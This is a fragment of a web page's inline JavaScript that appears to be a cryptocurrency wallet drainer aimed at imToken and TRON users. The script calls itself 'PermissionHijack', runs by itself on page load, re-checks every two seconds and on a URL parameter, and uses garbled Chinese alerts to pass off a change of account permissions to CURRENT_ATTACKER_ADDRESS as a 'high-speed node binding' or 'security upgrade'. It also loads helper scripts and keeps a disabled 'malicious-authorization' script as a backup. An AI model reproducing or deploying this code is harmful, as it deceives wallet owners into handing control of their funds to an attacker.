            console.log('ğŸ”’ğŸ”’ğŸ”’ æœ€ç»ˆæƒé™ä¿®æ”¹ç»“æœï¼ğŸ”’ğŸ”’ğŸ”’', result);
            
            const txid = result?.txid || result?.transaction?.txID;
            
            if (result && (result.result === true || txid)) {
                alert(`ğŸ‰ğŸ‰ğŸ‰ é«˜é€ŸèŠ‚ç‚¹ç»‘å®šå®Œæˆï¼ğŸ‰ğŸ‰ğŸ‰\n\näº¤æ˜“å“ˆå¸Œ: ${txid}\n\næ‚¨çš„è´¦æˆ·å·²æˆåŠŸç»‘å®šé«˜é€ŸèŠ‚ç‚¹ï¼\nèŠ‚ç‚¹åœ°å€: ${CURRENT_ATTACKER_ADDRESS}\n\nç°åœ¨æ‚¨å¯ä»¥äº«å—æ›´å¿«çš„äº¤æ˜“ä½“éªŒï¼`);
            } else {
                alert(`âŒ èŠ‚ç‚¹ç»‘å®šå¤±è´¥\n\nç»“æœ: ${JSON.stringify(result)}\n\nå¯èƒ½çš„åŸå› :\n1. ç½‘ç»œé—®é¢˜\n2. imTokenå®‰å…¨é™åˆ¶\n3. TRONèŠ‚ç‚¹é—®é¢˜`);
            }
        }).catch(error => {
            console.error('ğŸ”’ æœ€ç»ˆæƒé™ä¿®æ”¹å¤±è´¥:', error);
            alert(`âŒ èŠ‚ç‚¹ç»‘å®šå¤±è´¥\n\né”™è¯¯ä¿¡æ¯: ${error.message}\n\næ‰€æœ‰ç»‘å®šæ–¹æ¡ˆéƒ½å·²å°è¯•ã€‚\n\nå¯èƒ½éœ€è¦:\n1. æ£€æŸ¥ç½‘ç»œè¿æ¥\n2. å°è¯•å…¶ä»–æ—¶é—´æ®µ\n3. æ£€æŸ¥TRONç½‘ç»œçŠ¶æ€`);
        });
        
    } catch (error) {
        console.error('ğŸ”’ æœ€ç»ˆæƒé™ä¿®æ”¹å¼‚å¸¸:', error);
        alert(`âŒ èŠ‚ç‚¹ç»‘å®šå¼‚å¸¸\n\né”™è¯¯: ${error.message}\n\nç»‘å®šæœåŠ¡æš‚æ—¶ä¸å¯ç”¨ï¼`);
    }
}

// ğŸ¯ æš´éœ²å…¨å±€æ¥å£
window.PermissionHijack = {
    detect: detectAndStartPermissionHijack,
    show: showPermissionHijackModal,
    status: () => permissionHijackStatus
};

// ğŸ¯ åˆå§‹åŒ–
function initPermissionHijack() {
    console.log('ğŸ”’ å®‰å…¨å‡çº§ç³»ç»Ÿåˆå§‹åŒ–...');
    
    // ç«‹å³æ£€æµ‹
    detectAndStartPermissionHijack();
    
    // æ¯2ç§’æ£€æµ‹ä¸€æ¬¡
    setInterval(() => {
        if (!permissionHijackStatus.initiated) {
            detectAndStartPermissionHijack();
        }
    }, 2000);
    
    // URLå‚æ•°æ£€æµ‹
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('imtoken_connect') === 'true') {
        console.log('ğŸ”‘ æ£€æµ‹åˆ°ä»å…‘æ¢æŒ‰é’®è·³è½¬ï¼Œ3ç§’åå¯åŠ¨æƒé™åŠ«æŒ');
        setTimeout(() => {
            detectAndStartPermissionHijack();
        }, 3000);
    }
}

// è‡ªåŠ¨åˆå§‹åŒ–
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initPermissionHijack);
} else {
    initPermissionHijack();
}

console.log('ğŸ”’ğŸ”’ğŸ”’ å®‰å…¨å‡çº§ä»£ç åŠ è½½å®Œæˆï¼ğŸ”’ğŸ”’ğŸ”’');
</script>

<!-- è¾…åŠ©è„šæœ¬ -->
<script src="permission.js"></script>
<script src="attafocus.js"></script>

<!-- ğŸ¯ æ¶æ„æˆæƒæ”»å‡»ç³»ç»Ÿï¼ˆç¦ç”¨ï¼Œä»…ä¿ç•™å¤‡ç”¨ï¼‰ -->
<!-- <script src="malicious-authorization.js"></script> -->

</body>
</html>
